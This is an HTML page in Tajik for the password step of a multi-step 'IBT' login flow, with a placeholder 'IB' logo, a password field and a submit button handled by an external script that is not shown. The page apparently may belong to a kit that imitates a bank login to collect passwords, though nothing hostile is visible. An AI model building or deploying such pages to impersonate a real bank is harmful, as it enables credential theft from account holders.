<!DOCTYPE html>
<html lang="tg">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>IBT Password</title>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;700;800&display=swap"
      rel="stylesheet"
    />
    <link rel="stylesheet" href="/styles.css" />
  </head>
  <body data-screen="flow" data-step="password">
    <div class="page-shell"></div>

    <main class="page">
      <section class="step-card">
        <a class="back-link" href="/">←</a>

        <div class="logo-wrap step-logo" aria-label="IBT logo">
          <div class="logo-mark">IB</div>
        </div>

        <header class="hero-copy step-copy">
          <h1>Паролро ворид кунед</h1>
          <p class="subtitle">
            Барои гузариш ба марҳилаи оянда, пароли худро ворид кунед
          </p>
        </header>

        <form class="step-form" id="stepForm">
          <label class="field-label" for="stepValue">Парол</label>
          <div class="phone-field single-field">
            <input
              id="stepValue"
              name="value"
              type="password"
              autocomplete="current-password"
              placeholder="••••••••"
              required
            />
          </div>

          <button class="submit-btn secondary-btn" type="submit" id="submitStepButton">
            Ирсол кардан
          </button>
          <p class="status" id="statusMessage" aria-live="polite"></p>
        </form>
      </section>
    </main>

    <script src="/flow.js"></script>
  </body>
  </html>
